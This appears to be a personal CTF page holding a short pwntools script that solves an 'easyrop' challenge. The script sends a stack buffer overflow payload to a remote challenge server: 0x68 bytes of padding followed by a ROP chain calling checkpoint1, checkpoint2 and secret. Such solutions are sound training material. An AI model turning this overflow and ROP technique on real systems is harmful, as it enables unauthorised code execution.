---
layout: default
---
|<script src="https://tryhackme.com/badge/60599"></script> |<script src="https://www.hackthebox.eu/badge/277042"></script>|

```py
from pwn import *

#p = process('./easyrop')
p = remote('hsg1.superhero1.com', 9002)
e = ELF('./easyrop')

ckpt1 = p64(e.symbols.checkpoint1) # finds address
ckpt2 = p64(e.symbols.checkpoint2)
secret = p64(e.symbols.secret)
#print(ckpt1, ckpt2)

# start interaction
# padding 
padding = b'A' *0x68  # 96 + 8 
payload = padding
payload += ckpt1
payload += ckpt2
payload += secret

p.sendline(payload)
data = p.recvall()
print(data)

```